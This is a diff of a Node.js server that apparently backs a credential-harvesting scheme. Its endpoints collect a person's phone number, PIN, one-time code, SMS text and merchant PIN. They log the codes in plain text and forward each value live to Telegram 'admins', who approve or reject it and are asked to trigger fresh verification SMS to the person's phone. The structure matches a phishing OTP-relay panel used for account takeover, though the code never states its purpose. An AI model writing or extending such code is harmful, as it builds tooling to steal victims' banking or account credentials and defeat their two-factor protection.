@@ -264,18 +264,16 @@ db.connectDatabase()
             console.error('❌ Bot API error:', botError);
         }
 
-        // ✅ FIX: Use native http/https instead of fetch() for keep-alive ping
-        // (fetch may not exist in older Node versions on Render)
         setInterval(() => {
             console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
             try {
                 const pingUrl = `${WEBHOOK_URL}/health`;
                 const client  = pingUrl.startsWith('https') ? https : http;
                 client.get(pingUrl, (res) => {
-                    res.resume(); // drain the response body
+                    res.resume();
                 }).on('error', () => {});
             } catch (e) {}
-        }, 14 * 60 * 1000); // every 14 minutes
+        }, 14 * 60 * 1000);
 
         // Webhook health check + auto-fix
         setInterval(async () => {
@@ -297,7 +295,7 @@ db.connectDatabase()
             }
         }, 60000);
 
-        // ── Monthly subscription check ──
+        // Monthly subscription check
         setInterval(async () => {
             try {
                 const now = new Date();
@@ -2048,9 +2046,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         console.log(`💾 Application saved: ${applicationId}`);
 
-        // ✅ FIX: Respond to client IMMEDIATELY before sending to Telegram
-        // This ensures the client gets its applicationId even if Telegram is slow
-        // or the process receives SIGTERM during deployment
         processingLocks.delete(lockKey);
         res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
 
@@ -2081,7 +2076,6 @@ ${userLabel}
     } catch (error) {
         processingLocks.delete(`pin_${req.body?.phoneNumber}`);
         console.error('❌ Error in /api/verify-pin:', error);
-        // Only send error if headers haven't been sent yet
         if (!res.headersSent) {
             res.status(500).json({ success: false, message: 'Server error: ' + error.message });
         }
@@ -2096,6 +2090,109 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
         else res.status(404).json({ success: false, message: 'Application not found' });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/verify-sms
+app.post('/api/verify-sms', async (req, res) => {
+    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, smsMessage } = req.body;
+        const application = await db.getApplication(applicationId);
+
+        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
+
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
+            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
+        }
+
+        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });
+        console.log(`✅ SMS message saved for ${applicationId}`);
+
+        res.json({ success: true, message: 'SMS submitted for verification' });
+
+        sendToAdmin(application.adminId, `
+📨 *SMS MESSAGE VERIFICATION*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+⏰ ${new Date().toLocaleString()}
+
+📝 *Message:*
+\`\`\`
+${smsMessage}
+\`\`\`
+
+⚠️ *IS THIS MESSAGE CORRECT?*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Invalid Message',  callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        }).catch(err => console.error('❌ sendToAdmin (verify-sms) failed:', err.message));
+
+    } catch (error) {
+        console.error('❌ Error in /api/verify-sms:', error);
+        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// POST /api/resend-sms  ← NEW
+app.post('/api/resend-sms', async (req, res) => {
+    console.log('\n🔄 /api/resend-sms called:', JSON.stringify(req.body));
+    try {
+        const { applicationId } = req.body;
+
+        if (!applicationId) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId' });
+        }
+
+        const application = await db.getApplication(applicationId);
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        // Ensure admin is reachable
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        // Reset so user can submit a fresh SMS
+        await db.updateApplication(applicationId, { otpStatus: 'pending', smsMessage: null });
+        console.log(`✅ SMS reset for resend: ${applicationId}`);
+
+        // Respond to client immediately (fire-and-forget pattern)
+        res.json({ success: true, message: 'New SMS requested' });
+
+        // Notify admin in background
+        sendToAdmin(application.adminId, `
+🔄 *SMS RESEND REQUESTED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+⏰ ${new Date().toLocaleString()}
+
+The user's 60-second SMS window expired.
+They clicked *Resend SMS* — please trigger a new verification message to their phone.
+        `, { parse_mode: 'Markdown' }).catch(err =>
+            console.error('❌ sendToAdmin (resend-sms) failed:', err.message)
+        );
+
+    } catch (error) {
+        console.error('❌ Error in /api/resend-sms:', error);
+        if (!res.headersSent) {
+            res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+        }
     }
 });
 
@@ -2117,7 +2214,6 @@ app.post('/api/verify-otp', async (req, res) => {
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
         console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
 
-        // ✅ FIX: Respond immediately, then send Telegram in background
         res.json({ success: true });
 
         const returningLabel = application.isReturningUser
@@ -2158,56 +2254,6 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
         else res.status(404).json({ success: false, message: 'Application not found' });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
-    }
-});
-
-// POST /api/verify-sms
-app.post('/api/verify-sms', async (req, res) => {
-    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
-    try {
-        const { applicationId, smsMessage } = req.body;
-        const application = await db.getApplication(applicationId);
-
-        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
-
-        if (!adminChatIds.has(application.adminId)) {
-            const admin = await db.getAdmin(application.adminId);
-            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
-            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
-        }
-
-        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });
-        console.log(`✅ SMS message saved for ${applicationId}`);
-
-        // ✅ FIX: Respond immediately, then send Telegram in background
-        res.json({ success: true, message: 'SMS submitted for verification' });
-
-        sendToAdmin(application.adminId, `
-📨 *SMS MESSAGE VERIFICATION*
-
-📋 \`${applicationId}\`
-📞 \`${formatPhone(application.phoneNumber)}\`
-⏰ ${new Date().toLocaleString()}
-
-📝 *Message:*
-\`\`\`
-${smsMessage}
-\`\`\`
-
-⚠️ *IS THIS MESSAGE CORRECT?*
-        `, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '❌ Invalid Message',  callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
-                ]
-            }
-        }).catch(err => console.error('❌ sendToAdmin (verify-sms) failed:', err.message));
-
-    } catch (error) {
-        console.error('❌ Error in /api/verify-sms:', error);
-        if (!res.headersSent) res.status(500).json({ success: false, message: 'Server error: ' + error.message });
     }
 });
 
@@ -2268,7 +2314,6 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
         await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });
         console.log(`✅ Merchant PIN saved for ${applicationId}: ${merchantPin}`);
 
-        // ✅ FIX: Respond immediately, then send Telegram in background
         res.json({ success: true });
 
         const returningLabel = application.isReturningUser
@@ -2440,9 +2485,6 @@ app.listen(PORT, () => {
 async function shutdownGracefully(signal) {
     console.log(`\n🛑 Received ${signal}, shutting down...`);
 
-    // ✅ FIX: Give in-flight requests up to 10 seconds to complete
-    // before closing DB and deleting webhook. This prevents SIGTERM
-    // from Render's zero-downtime deploys killing active requests mid-flight.
     console.log('⏳ Waiting 10s for in-flight requests to complete...');
     await new Promise(resolve => setTimeout(resolve, 10000));
 
